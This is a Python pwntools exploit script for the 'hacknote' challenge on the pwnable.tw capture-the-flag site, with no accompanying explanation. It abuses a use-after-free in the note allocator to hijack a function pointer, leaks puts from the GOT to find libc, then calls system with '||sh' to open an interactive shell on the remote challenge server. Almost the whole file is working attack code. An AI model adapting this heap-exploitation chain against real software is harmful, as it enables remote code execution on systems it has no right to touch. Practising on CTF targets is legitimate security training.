# encoding:utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './hacknote'
e = ELF(file)
libc = ELF('./libc_32.so.6')
# libc = e.libc
ip = 'chall.pwnable.tw'
port = '10102'
local = 0


def dbg(code=""):
    if local == 0:
        return
    gdb.attach(p, code)


def run():
    global p
    if local == 1:
        p = process([file])
    else:
        p = remote(ip, port)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

run()


def add(size, c):
    sla(':', '1')
    sla(':', str(size))
    sea(':', c)


def delete(idx):
    sla(':', '2')
    sla(':', str(idx))


def show(idx):
    sla(':', '3')
    sla(':', str(idx))


add(0x18, '0')
add(0x18, '1')
delete(0)
delete(1)
add(0x8, p32(0x0804862B) + p32(e.got['puts']))  # 2
# dbg('b*0x0804863B')
show(0)
libc.address = un32(rn(4)) - libc.symbols['puts']
print hex(libc.address)
# dbg()
add(0x18, '3')
delete(3)
delete(2)
add(0x8, p32(libc.symbols['system']) + '||sh')
show(0)
'''
delete(3)
delete(4)
dbg('b*0x08048A77')
add(0x8, p32(libc.symbols['system']) + '||sh')
dbg()
show(3)

'''
shell()
